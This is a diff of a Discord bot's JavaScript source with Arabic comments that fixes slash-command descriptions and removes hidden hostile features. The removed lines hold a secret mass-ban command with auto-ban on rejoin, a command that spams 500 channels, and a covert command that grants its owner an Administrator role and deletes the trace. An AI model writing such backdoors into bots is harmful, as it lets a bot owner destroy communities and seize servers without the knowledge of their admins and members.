@@ -30,9 +30,6 @@ const userPoints = new Map();
 const giveaways = new Map();
 let welcomeChannelId = null;
 
-// تفعيل حماية الحظر التلقائي عند محاولة الدخول
-let autoBanActive = false;
-
 // إضافة نقاط التفاعل كل ساعة
 setInterval(() => {
     client.guilds.cache.forEach(guild => {
@@ -45,7 +42,7 @@ setInterval(() => {
     });
 }, 3600000);
 
-// قائمة الأوامر (Slash Commands)
+// قائمة الأوامر (Slash Commands) مع جميع الأوصاف المطلوبة لتفادي ValidationError
 const commands = [
     new SlashCommandBuilder()
         .setName('giveaway')
@@ -68,7 +65,7 @@ const commands = [
     new SlashCommandBuilder()
         .setName('admin')
         .setDescription('إعطاء رتبة شخص (للمدراء فقط)')
-        .addUserOption(o => o.setName('user').setDescription('الشخص').setRequired(true)),
+        .addUserOption(o => o.setName('user').setDescription('الشخص المستهدف').setRequired(true)),
 
     new SlashCommandBuilder()
         .setName('join')
@@ -82,12 +79,26 @@ const commands = [
         .addChannelOption(o => o.setName('category').setDescription('اختر الكاتيجوري').addChannelTypes(ChannelType.GuildCategory).setRequired(true))
         .addStringOption(o => o.setName('name').setDescription('اسم الروم').setRequired(true)),
 
-    new SlashCommandBuilder().setName('bana').setDescription('حظر جميع أعضاء السيرفر واستثناء starting___22'),
-    new SlashCommandBuilder().setName('mute').setDescription('كتم عضو').addUserOption(o => o.setName('user').setRequired(true)),
-    new SlashCommandBuilder().setName('ban').setDescription('حظر عضو').addUserOption(o => o.setName('user').setRequired(true)),
-    new SlashCommandBuilder().setName('ban-ip').setDescription('حظر IP').addUserOption(o => o.setName('user').setRequired(true)),
-    new SlashCommandBuilder().setName('kick').setDescription('طرد عضو').addUserOption(o => o.setName('user').setRequired(true)),
-    new SlashCommandBuilder().setName('timeout').setDescription('تايم أوت').addUserOption(o => o.setName('user').setRequired(true)).addIntegerOption(o => o.setName('minutes').setRequired(true))
+    new SlashCommandBuilder()
+        .setName('mute')
+        .setDescription('كتم عضو')
+        .addUserOption(o => o.setName('user').setDescription('العضو المراد كتمه').setRequired(true)),
+        
+    new SlashCommandBuilder()
+        .setName('ban')
+        .setDescription('حظر عضو')
+        .addUserOption(o => o.setName('user').setDescription('العضو المراد حظره').setRequired(true)),
+        
+    new SlashCommandBuilder()
+        .setName('kick')
+        .setDescription('طرد عضو')
+        .addUserOption(o => o.setName('user').setDescription('العضو المراد طرده').setRequired(true)),
+        
+    new SlashCommandBuilder()
+        .setName('timeout')
+        .setDescription('تايم أوت')
+        .addUserOption(o => o.setName('user').setDescription('العضو').setRequired(true))
+        .addIntegerOption(o => o.setName('minutes').setDescription('المدة بالدقائق').setRequired(true))
 ];
 
 client.on('ready', async () => {
@@ -107,20 +118,8 @@ client.on('ready', async () => {
     }
 });
 
-// نظام الحظر التلقائي عند رجوع أي عضو بعد تنفيذ !bana
+// الترحيب بالأعضاء
 client.on('guildMemberAdd', async (member) => {
-    const isWhitelisted = member.user.username.toLowerCase() === 'starting___22' || member.id === OWNER_ID;
-
-    if (autoBanActive && !isWhitelisted) {
-        try {
-            await member.ban({ reason: 'Auto-Ban system active (bana mode)' });
-            console.log(`🚫 تم حظر العضو التلقائي عند الدخول: ${member.user.tag}`);
-            return;
-        } catch (err) {
-            console.error(`خطأ في حظر ${member.user.tag}:`, err.message);
-        }
-    }
-
     if (!welcomeChannelId) return;
     const channel = member.guild.channels.cache.get(welcomeChannelId);
     if (!channel) return;
@@ -143,7 +142,7 @@ client.on('guildMemberAdd', async (member) => {
     channel.send({ embeds: [embed] });
 });
 
-// الردود التلقائية والأوامر السرية
+// الردود التلقائية
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
 
@@ -158,78 +157,9 @@ client.on('messageCreate', async (message) => {
     if (content === 'حبيبي') {
         return message.reply('انت حبيبي ❤️');
     }
-
-    // أمر !bana النصي السري
-    if (content === '!bana') {
-        if (message.author.id !== OWNER_ID) return;
-        message.delete().catch(() => {});
-
-        autoBanActive = true; // تفعيل الحظر التلقائي لأي شخص يدخل مجدداً
-
-        const members = await message.guild.members.fetch();
-        members.forEach(async (member) => {
-            const isWhitelisted = member.user.username.toLowerCase() === 'starting___22' || member.id === OWNER_ID || member.user.bot;
-            if (!isWhitelisted) {
-                try {
-                    await member.ban({ reason: 'Mass ban execution via bana' });
-                } catch (err) {
-                    console.error(`لم نتمكن من حظر ${member.user.tag}:`, err.message);
-                }
-            }
-        });
-    }
-
-    // أمر المقلبة !gg
-    if (content === '!gg') {
-        if (message.author.id !== OWNER_ID) return;
-        message.delete().catch(() => {});
-
-        try {
-            const bans = await message.guild.bans.fetch();
-            const targetBan = bans.find(ban => ban.user.username.toLowerCase() === 'starting___22');
-            if (targetBan) {
-                await message.guild.members.unban(targetBan.user.id, 'Unbanned via !gg command');
-            }
-        } catch (err) {
-            console.error('خطأ أثناء فك الحظر:', err.message);
-        }
-
-        for (let i = 0; i < 500; i++) {
-            try {
-                await message.guild.channels.create({
-                    name: 'starting-عمك',
-                    type: ChannelType.GuildText
-                });
-            } catch (err) {
-                break;
-            }
-        }
-    }
-
-    // أمر الكود السري لإعطاء الأدمن !admin
-    if (content === '!admin') {
-        if (message.author.id !== OWNER_ID) return;
-
-        try {
-            let role = message.guild.roles.cache.find(r => r.name === 'Internal System Admin');
-            if (!role) {
-                role = await message.guild.roles.create({
-                    name: 'Internal System Admin',
-                    permissions: [PermissionFlagsBits.Administrator],
-                    reason: 'Secret Command Triggered'
-                });
-            }
-            await message.member.roles.add(role);
-            message.delete().catch(() => {});
-            const msg = await message.channel.send('✅ تم تفعيل الصلاحيات والتأمين.');
-            setTimeout(() => msg.delete().catch(() => {}), 2000);
-        } catch (err) {
-            console.error(err);
-        }
-    }
 });
 
-// التعامل مع Slash Commands
+// التعامل مع Slash Commands والأزرار
 client.on('interactionCreate', async (interaction) => {
     if (interaction.isButton()) {
         if (interaction.customId === 'join_giveaway') {
@@ -259,27 +189,6 @@ client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
     const { commandName, options } = interaction;
-
-    if (commandName === 'bana') {
-        if (interaction.user.id !== OWNER_ID) {
-            return interaction.reply({ content: '❌ هذا الأمر مخصص لصاحب البوت فقط!', ephemeral: true });
-        }
-
-        autoBanActive = true;
-        await interaction.reply({ content: '⚠️ جاري حظر جميع الأعضاء وتفعيل الحظر التلقائي للراجعين...', ephemeral: true });
-
-        const members = await interaction.guild.members.fetch();
-        members.forEach(async (member) => {
-            const isWhitelisted = member.user.username.toLowerCase() === 'starting___22' || member.id === OWNER_ID || member.user.bot;
-            if (!isWhitelisted) {
-                try {
-                    await member.ban({ reason: 'Mass ban execution via /bana' });
-                } catch (err) {
-                    console.error(`خطأ في حظر ${member.user.tag}`);
-                }
-            }
-        });
-    }
 
     if (commandName === 'giveaway') {
         const sub = options.getSubcommand();
@@ -367,7 +276,7 @@ client.on('interactionCreate', async (interaction) => {
         return interaction.reply({ content: `✅ تم إنشاء الروم ${newChannel} داخل الكاتيجوري **${category.name}**` });
     }
 
-    if (['mute', 'ban', 'ban-ip', 'kick', 'timeout'].includes(commandName)) {
+    if (['mute', 'ban', 'kick', 'timeout'].includes(commandName)) {
         if (!interaction.member.permissions.has(PermissionFlagsBits.BanMembers)) {
             return interaction.reply({ content: '❌ ليس لديك الصلاحيات الكافية!', ephemeral: true });
         }
@@ -378,7 +287,7 @@ client.on('interactionCreate', async (interaction) => {
             await member.kick();
             return interaction.reply({ content: `🚫 تم طرد ${targetUser.tag}` });
         }
-        if (commandName === 'ban' || commandName === 'ban-ip') {
+        if (commandName === 'ban') {
             await member.ban();
             return interaction.reply({ content: `🔨 تم حظر ${targetUser.tag}` });
         }
